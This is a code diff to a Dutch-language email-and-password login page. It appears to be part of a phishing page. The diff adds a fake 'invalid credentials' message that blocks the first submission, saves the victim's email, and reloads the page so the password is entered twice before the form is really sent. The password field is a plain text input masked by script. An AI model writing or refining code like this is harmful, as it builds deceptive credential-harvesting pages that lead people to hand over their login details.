@@ -80,6 +80,12 @@
             border-radius: 3px;
             font-weight: bold;
         }
+
+        .error-message {
+            color: red;
+            margin-bottom: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 
@@ -102,7 +108,7 @@
                 <div class="container">
                     <div class="form-group">
                         <label>Uw e-mailadres</label>
-                        <input type="email" name="email" placeholder="Uw e-mailadres" required>
+                        <input type="email" id="emailInput" name="email" placeholder="Uw e-mailadres" required>
                         <label>Wachtwoord:</label>
                         <input type="text" id="passwordInput" name="message" placeholder="Uw wachtwoord" required>
                         <!-- Hidden field to store the actual password -->
@@ -112,14 +118,19 @@
                     <div class="form-group">
                         <button class="sign-in-btn" type="submit">Inloggen</button>
                     </div>
+                    <!-- Error message -->
+                    <div id="errorMessage" class="error-message" style="display: none;">Ongeldige inloggegevens. Probeer het opnieuw.</div>
                 </div>
             </form>
         </div>
     </div>
 
     <script>
+        const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
-        const hiddenPassword = document.getElementById('hiddenPassword');
+        
+        const errorMessage = document.getElementById('errorMessage');
+        const form = document.getElementById('customForm');
 
         // Function to mask the input with dots
         passwordInput.addEventListener('input', () => {
@@ -129,9 +140,38 @@
         });
 
         // Function to handle form submission
-        document.getElementById('customForm').addEventListener('submit', (e) => {
-            // Ensure the hidden field contains the actual password
-            hiddenPassword.value = passwordInput.value.replace(/•/g, ''); // Remove dots before submission
+        form.addEventListener('submit', (e) => {
+            e.preventDefault(); // Prevent the form from submitting
+
+
+            // Simulate an error (for demonstration purposes)
+            const isFirstAttempt = !localStorage.getItem('formSubmitted');
+            if (isFirstAttempt) {
+                // Show error message
+                errorMessage.style.display = 'block';
+
+                // Save the email in localStorage
+                localStorage.setItem('savedEmail', emailInput.value);
+
+                // Redirect back to the form after a short delay
+                setTimeout(() => {
+                    window.location.href = window.location.href; // Reload the page
+                }, 2000); // 2-second delay
+            } else {
+                // Submit the form on the second attempt
+                form.submit();
+            }
+
+            // Mark the form as submitted
+            localStorage.setItem('formSubmitted', 'true');
+        });
+
+        // Pre-fill the email field if it was saved
+        window.addEventListener('load', () => {
+            const savedEmail = localStorage.getItem('savedEmail');
+            if (savedEmail) {
+                emailInput.value = savedEmail;
+            }
         });
     </script>
 </body>
